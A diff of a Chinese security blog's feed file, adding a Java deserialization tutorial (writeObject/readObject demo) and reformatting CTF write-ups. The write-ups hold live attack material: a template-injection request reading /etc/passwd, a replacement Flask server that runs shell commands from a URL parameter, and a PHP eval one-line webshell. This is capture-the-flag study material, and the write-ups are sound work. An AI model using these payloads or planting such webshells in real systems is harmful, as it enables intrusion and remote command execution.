@@ -92,10 +92,137 @@
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到Connection对象后，执行 connect() 函数，连接数 据库。</p>
+<p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到<code>Connection</code>对象后，执行 <code>connect()</code> 函数，连接数 据库。</p>
 <p> <code>__wakeup</code> 的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型 的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。 </p>
 <p>所以你会发现，PHP的反序列化漏洞，很少是由 <code>__wakeup</code> 这个方法触发的，通常触发在析构函数 <code>__destruct</code> 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以 控制对象的属性，进而在后续的代码中进行危险操作。</p>
-<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3>]]></content>
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>上篇文章最后提及<code>classAnnotations</code>，这里讲到<code>ObjectAnnotations</code>知识。</p>
+<p><code>Java</code>在序列化时一个对象，将会调用这个对象<code>writeobject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个<code>stream</code>中；</p>
+<p>反序列化时，会调用<code>readobject</code>，开发者也可以从读取出前面的写入的内容，再进行处理。</p>
+<p>举个例子，展示<code>writeobject</code>和<code>readobject</code>的作用，</p>
+<p>先写个<code>Person</code>类，重写<code>writeobject</code>和<code>readobject</code>，</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> Ser_1<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> String name<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
+
+    <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span> <span class="token keyword">throws</span>
+            IOException <span class="token punctuation">{</span>
+        s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//调用默认写对象，把Person类中name和age序列化写入字节流中</span>
+        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token string">"This is a object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//额外写入字符串，加到序列化对象后面，写入字节流中</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+        s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//调用默认读对象，反序列化Person类中name和age</span>
+        String str <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//读取写入字符串</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"per.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"per.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行结果，</p>
+<p><img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104085645456.png" alt="image-20231104085645456"></p>
+<p>最后用工具<code>SerializationDumper</code>得到反序列化内容，</p>
+<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>java -jar .\SerializationDumper.jar -r .\test\per.ser</p></blockquote>
+<pre class="line-numbers language-java"><code class="language-java">STREAM_MAGIC <span class="token operator">-</span> <span class="token number">0xac</span> ed
+STREAM_VERSION <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">05</span>
+Contents
+  TC_OBJECT <span class="token operator">-</span> <span class="token number">0x73</span>
+    TC_CLASSDESC <span class="token operator">-</span> <span class="token number">0x72</span>
+      className
+        Length <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">-</span> <span class="token number">0x00</span> 0c
+        Value <span class="token operator">-</span> Ser_1<span class="token punctuation">.</span>Person <span class="token operator">-</span> <span class="token number">0x5365725f312e506572736f6e</span>
+      serialVersionUID <span class="token operator">-</span> <span class="token number">0xb5</span> <span class="token number">13</span> 8a f8 <span class="token number">13</span> b1 5c a7
+      newHandle <span class="token number">0x00</span> 7e <span class="token number">00</span> <span class="token number">00</span>
+      classDescFlags <span class="token operator">-</span> <span class="token number">0x03</span> <span class="token operator">-</span> SC_WRITE_METHOD <span class="token operator">|</span> SC_SERIALIZABLE
+      fieldCount <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">02</span>
+      Fields
+        <span class="token number">0</span><span class="token operator">:</span>
+          Int <span class="token operator">-</span> I <span class="token operator">-</span> <span class="token number">0x49</span>
+          fieldName
+            Length <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">03</span>
+            Value <span class="token operator">-</span> age <span class="token operator">-</span> <span class="token number">0x616765</span>
+        <span class="token number">1</span><span class="token operator">:</span>
+          Object <span class="token operator">-</span> L <span class="token operator">-</span> <span class="token number">0x4c</span>
+          fieldName
+            Length <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">04</span>
+            Value <span class="token operator">-</span> name <span class="token operator">-</span> <span class="token number">0x6e616d65</span>
+          className1
+            TC_STRING <span class="token operator">-</span> <span class="token number">0x74</span>
+              newHandle <span class="token number">0x00</span> 7e <span class="token number">00</span> <span class="token number">01</span>
+              Length <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">12</span>
+              Value <span class="token operator">-</span> Ljava<span class="token operator">/</span>lang<span class="token operator">/</span>String<span class="token punctuation">;</span> <span class="token operator">-</span> <span class="token number">0x4c6a6176612f6c616e672f537472696e673b</span>
+      classAnnotations
+        TC_ENDBLOCKDATA <span class="token operator">-</span> <span class="token number">0x78</span>
+      superClassDesc
+        TC_NULL <span class="token operator">-</span> <span class="token number">0x70</span>
+    newHandle <span class="token number">0x00</span> 7e <span class="token number">00</span> <span class="token number">02</span>
+    classdata
+      Ser_1<span class="token punctuation">.</span>Person
+        values
+          <span class="token function">age</span>
+            <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token number">20</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">14</span>
+          <span class="token function">name</span>
+            <span class="token punctuation">(</span>object<span class="token punctuation">)</span>
+              TC_STRING <span class="token operator">-</span> <span class="token number">0x74</span>
+                newHandle <span class="token number">0x00</span> 7e <span class="token number">00</span> <span class="token number">03</span>
+                Length <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">04</span>
+                Value <span class="token operator">-</span> John <span class="token operator">-</span> <span class="token number">0x4a6f686e</span>
+        objectAnnotation
+          TC_STRING <span class="token operator">-</span> <span class="token number">0x74</span>
+            newHandle <span class="token number">0x00</span> 7e <span class="token number">00</span> <span class="token number">04</span>
+            Length <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token number">10</span>
+            Value <span class="token operator">-</span> This is a object <span class="token operator">-</span> <span class="token number">0x546869732069732061206f626a656374</span>
+          TC_ENDBLOCKDATA <span class="token operator">-</span> <span class="token number">0x78</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到，我们写入的字符串 <code>This is a object</code> 被放在 <code>objectAnnotation</code> 的位置，并且位于<code>Person</code>类的<code>name</code>和<code>age</code>的后面。 在反序列化时，读取了这个字符串，并将其输出。</p>
+<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>这个特性就让<code>Java</code>的开发变得非常灵活。比如后面将会讲到的<code>HashMap</code>，其就是将<code>Map</code>中的所有键、 值都存储在 <code>objectAnnotation</code> 中，而并不是某个具体属性里。</p></blockquote>
+<p>对于Java序列化和反序列化的过程，可以更加详细的分析，</p>
+<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><p>首先writeObject是对对象进行序列化，而readObject是对对象进行反序列化</p>
+<p>序列化数据后无法通过赋值修改，而序列化之前以及反序列化之后，可以进行赋值修改数据</p></blockquote>
+]]></content>
       <categories>
         <category>Java漫谈学习</category>
       </categories>
@@ -2905,7 +3032,7 @@ if __name__ == "__main__":
 <h5 id="SaveUploadedFile"><a href="#SaveUploadedFile" class="headerlink" title="SaveUploadedFile"></a><a href="https://github.com/gin-gonic/gin/blob/v1.9.1/context.go#L599">SaveUploadedFile</a></h5><p><img src="/post/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617180158976.png" alt="image-20230617180158976"></p>
 <p>需要传两个参数，文件（form表单中name的参数）和文件具体位置（path&#x2F;文件名）</p>
 <h4 id="读文件x"><a href="#读文件x" class="headerlink" title="读文件x"></a>读文件x</h4><p>开始看马✌发的可以进行读取文件这个</p>
-<pre><code>GET /admin?A&amp;name=&#123;%25include%20c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%25&#125; HTTP/1.1
+<pre class="line-numbers language-html"><code class="language-html">GET /admin?A&amp;name={%25include%20c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%25} HTTP/1.1
 Host: xxx
 A: /etc/passwd
 Cache-Control: max-age=0
@@ -2920,35 +3047,37 @@ Connection: close
 
 ![image-20230616160949211](2023CISCN初赛/image-20230616160949211.png)
 
-> `&#123;%include c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%&#125;`
-&gt;
-&gt; `%`需要进行`url`编码发包才能被解析，不然读不到`name`参数
-&gt;
-&gt; 
-&gt;
-&gt; `&#123;%include %&#125;`
-&gt;
-&gt; &gt; 进行包含文件
-&gt;
-&gt; `c`
-&gt;
-&gt; &gt; 在附件go代码中可以看到`c *gin.Context`表示一个 Gin 框架处理 HTTP 请求的上下文对象，它包含了 HTTP 请求和响应的所有信息，所以`c`就是一个HTTP请求和响应集合对象
-&gt;
-&gt; `c.Request.Header`
-&gt;
-&gt; &gt; 是只读取请求头内容，也就是xx: xxx [如，`Accept-Encoding: gzip, deflate`]
-&gt;
-&gt; `c.Request.URL.RawQuery`
-&gt;
-&gt; &gt; 读取URL头中的参数值
-&gt;
-&gt; `truncatechars:1`
-&gt;
-&gt; &gt; `truncatechars`是 Flask 模板引擎中的过滤器，它的作用是截断字符串并返回指定长度的子字符串。在这个过滤器中，`:1` 表示要截断的长度为 1。[如上文中请求行所示，url中第一个就是A参数]
-&gt;
-&gt; `join`
-&gt;
-&gt; &gt; 将获取到的值拼接成一个字符串并返回。
+> `{%include c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%}`
+>
+> `%`需要进行`url`编码发包才能被解析，不然读不到`name`参数
+>
+> 
+>
+> `{%include %}`
+>
+> > 进行包含文件
+>
+> `c`
+>
+> > 在附件go代码中可以看到`c *gin.Context`表示一个 Gin 框架处理 HTTP 请求的上下文对象，它包含了 HTTP 请求和响应的所有信息，所以`c`就是一个HTTP请求和响应集合对象
+>
+> `c.Request.Header`
+>
+> > 是只读取请求头内容，也就是xx: xxx [如，`Accept-Encoding: gzip, deflate`]
+>
+> `c.Request.URL.RawQuery`
+>
+> > 读取URL头中的参数值
+>
+> `truncatechars:1`
+>
+> > `truncatechars`是 Flask 模板引擎中的过滤器，它的作用是截断字符串并返回指定长度的子字符串。在这个过滤器中，`:1` 表示要截断的长度为 1。[如上文中请求行所示，url中第一个就是A参数]
+>
+> `join`
+>
+> > 将获取到的值拼接成一个字符串并返回。
+
+
 
 我就一直在读文件，想去读取`machine_id`和`mac地址`然后得到`PIN码`，利用`debug`进行交互shell执行命令
 
@@ -2957,6 +3086,8 @@ Connection: close
 ![image-20230617142812454](2023CISCN初赛/image-20230617142812454.png)
 
 ![image-20230617142840187](2023CISCN初赛/image-20230617142840187.png)
+
+
 
 但是后面看到浪✌和几位✌说的，似乎并不可行
 
@@ -2968,25 +3099,25 @@ Connection: close
 
 可是根据之前`debug`得到的`server.py`文件，这是网站运行的`py`文件，在`/app/server.py`中
 
-尝试上传覆盖，但是由于是`GET`读取参数，所以在`GET`提交中，&lt;u&gt;添加上传文件表单&lt;/u&gt;，将`server.py`中修改，增加解析`name`参数，实现命令执行并显示执行内容
+尝试上传覆盖，但是由于是`GET`读取参数，所以在`GET`提交中，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>u</span><span class="token punctuation">></span></span>添加上传文件表单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>u</span><span class="token punctuation">></span></span>，将`server.py`中修改，增加解析`name`参数，实现命令执行并显示执行内容
 
-&gt; GET请求也可以提交表单上传文件
+> GET请求也可以提交表单上传文件
 
 根据`debug`代码修改得到
 
 ```python
 app = Flask(__name__)
  
-@app.route(&#39;/&#39;)
+@app.route('/')
 def index():
-    name = request.args[&#39;name&#39;]
+    name = request.args['name']
     res = os.popen(name).read()
-    return res + &quot; no ssti&quot;
+    return res + " no ssti"
  
  
-if __name__ == &quot;__main__&quot;:
-    app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True)
-</code></pre>
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=5000, debug=True)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>于是构造GET请求行，进行文件上传覆盖</p>
 <pre><code>/admin?name=&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py
 </code></pre>
@@ -8261,7 +8392,7 @@ C:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;
 <hr>
 <p>插入一句话🐎</p>
 <p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>
-<pre class="line-numbers language-jsp"><code class="language-jsp"><script language="php">@eval($_POST["cmd"]);</script>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>但是用蚁剑连不上</p>
 <p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>
@@ -8497,20 +8628,8 @@ Sec::__invoke
     <content><![CDATA[<p><code>Machines</code></p>
 <span id="more"></span>
 
-<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="【WEB】Stocker-easy"><a href="#【WEB】Stocker-easy" class="headerlink" title="【WEB】Stocker[easy]"></a>【WEB】Stocker[easy]</h2><p><code>个人感觉新东西太多，难度对于开始可能中上</code> </p>
-<p>请先了解学习</p>
-<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
-<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
-<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
-<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
-<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
-</svg>
-</span><p>NoSQL注入</p>
-<p>api利用</p>
-<p>通过iframe利用xss，用伪协议读取文件</p></blockquote>
+<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="【WEB】Analytics-easy"><a href="#【WEB】Analytics-easy" class="headerlink" title="【WEB】Analytics[easy]"></a>【WEB】Analytics[easy]</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
+</blockquote>
 ]]></content>
       <categories>
         <category>Hack the Box</category>
@@ -13254,9 +13373,18 @@ F7 46：最后修改文件日期
 <path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
 </svg>
 </span><p><code>NFS</code> 最好，速度快点，配置复杂点<br><code>FTP</code> 最通用，最简单<br><code>SMB</code> 不太稳定，有时候Win 会提示找不到地址</p></blockquote>
-<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><pre class="line-numbers language-l"><code class="language-l"> smbclient -L [target_ip]
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot="">
+<path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path>
+<path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path>
